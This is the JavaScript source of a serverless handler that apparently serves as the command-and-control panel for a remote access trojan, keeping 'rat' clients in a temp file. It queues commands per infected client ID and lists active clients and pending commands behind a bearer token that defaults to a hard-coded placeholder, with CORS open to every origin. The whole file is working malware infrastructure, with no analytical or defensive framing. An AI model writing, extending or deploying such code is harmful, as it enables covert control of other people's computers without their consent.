const crypto = require('crypto');

// Shared storage (in production, use a database)
// Import from heartbeat or use shared module
let clients = new Map();
let commands = new Map();

// Import shared clients from heartbeat (simplified approach)
// In production, use a proper database or shared storage module
try {
  // Try to access shared storage
  const fs = require('fs');
  const path = require('path');
  const os = require('os');
  
  // Use temp file for sharing data between functions
  const tempFile = path.join(os.tmpdir(), 'rat-clients.json');
  
  if (fs.existsSync(tempFile)) {
    const data = JSON.parse(fs.readFileSync(tempFile, 'utf8'));
    clients = new Map(data.clients || []);
    commands = new Map(data.commands || []);
  }
  
  // Function to save state
  function saveState() {
    fs.writeFileSync(tempFile, JSON.stringify({
      clients: Array.from(clients.entries()),
      commands: Array.from(commands.entries())
    }));
  }
  
  // Auto-save every 5 seconds
  setInterval(saveState, 5000);
  
  // Export save function for other operations
  module.exports.saveState = saveState;
} catch (e) {
  console.log('Shared storage not available, using in-memory');
}

const AUTH_TOKEN = process.env.AUTH_TOKEN || 'default-token-change-me';

function verifyAuth(event) {
  const authHeader = event.headers.authorization || event.headers.Authorization;
  return authHeader === `Bearer ${AUTH_TOKEN}`;
}

exports.handler = async (event, context) => {
  // Enable CORS
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Client-ID',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  // Verify authentication
  if (!verifyAuth(event)) {
    return {
      statusCode: 401,
      headers,
      body: JSON.stringify({ error: 'Unauthorized' })
    };
  }

  try {
    if (event.httpMethod === 'POST') {
      const body = JSON.parse(event.body);
      const { clientId, command, parameters } = body;

      if (!clientId || !command) {
        return {
          statusCode: 400,
          headers,
          body: JSON.stringify({
            error: 'Missing required fields: clientId, command'
          })
        };
      }

      // Store command for client
      commands.set(clientId, {
        id: crypto.randomUUID(),
        command: command,
        parameters: parameters || {},
        timestamp: Date.now()
      });

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          status: 'command_queued',
          clientId: clientId,
          command: command,
          timestamp: Date.now()
        })
      };
    }

    if (event.httpMethod === 'GET') {
      // List all active clients and queued commands
      const clientList = Array.from(clients.entries()).map(([id, data]) => ({
        id,
        ...data,
        hasCommand: commands.has(id)
      }));

      const commandList = Array.from(commands.entries()).map(([clientId, cmd]) => ({
        clientId,
        ...cmd
      }));

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({
          clients: clientList,
          pendingCommands: commandList,
          timestamp: Date.now()
        })
      };
    }

    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };

  } catch (error) {
    console.error('Command error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Internal server error',
        message: error.message
      })
    };
  }
};
